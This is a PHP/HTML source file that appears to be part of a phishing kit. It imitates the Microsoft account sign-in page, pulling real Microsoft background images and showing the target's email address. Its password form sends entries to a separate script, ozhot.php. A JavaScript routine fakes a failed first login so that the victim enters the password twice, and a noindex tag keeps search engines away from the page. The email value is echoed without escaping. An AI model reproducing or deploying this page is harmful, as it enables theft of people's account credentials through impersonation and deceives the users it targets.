<?php
$mail =$_POST['eml'];//"kimo";
?>
<!DOCTYPE html>
<html dir="ltr">
<head>
	<meta name="robots" content="nofollow, noindex">
	<title>Sign in to your Microsoft account</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" type="image/png" href="./imges/ki.png" />
<link rel="stylesheet" type="text/css" href="./imges/niro.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script type="text/javascript">
function karimo(x){  
		
    		var erro = document.getElementById('Err');
			var norm = document.getElementById('norm');
	                if(x=='0') {  
	                    erro.style.display = 'block';
	                    norm.style.display = 'none';
	                    return false;
	    			}else{ 
	                    document.actionForm.submit();
	    			}
	    		}
</script>
</head>
<body>
	<div id="or">
		<div class="background" role="presentation" >
			<div style="background-image: url(&quot;https://auth.gfx.ms/16.000.27523.1/images/Backgrounds/0-small.jpg?x=12f4b8b543125cc986c79cd85320812f&quot;);"></div>
			<div class="backgroundImage" style="background-image: url(&quot;https://auth.gfx.ms/16.000.27523.1/images/Backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);"></div>
			<div class="background-overlay"></div>
		</div>
		<div class="inlo">
			<div class="middle">
				<div class="inner">
					<div class="identity"><?php echo $mail; ?></div>
					<?php echo "<form action=\"ozhot.php?Eml=".$mail."\" method=\"post\" autocomplete=\"off\" >"; ?>
						<div id="norm">
							<img src="./imges/B0.png" alt="B0" />
							<div id="pt"><input type="password" name="psswd" placeholder="Mot de passe" ></div>
							<div id="s0"><input type="image" src="./imges/S0.png" onclick="return karimo('0');"></div>
						</div>
						<div id="Err" style="display: none;">
							<img src="./imges/B01.png" alt="B01" />
							<div id="pt1"><input type="password" name="psswd1" minlength="6" placeholder="Mot de passe" required></div>
							<div id="s01"><input type="image" src="./imges/S0.png"  onclick="return karimo('1');"></div>
						</div>
					</form>
				</div>
			</div>
		</div>
	</div>
	<div id="footer" class="footer"> 
		<div id="" class="footerNode">
			<img src="./imges/out.png" alt="#" />
		</div>
	</div>
</body>
</html>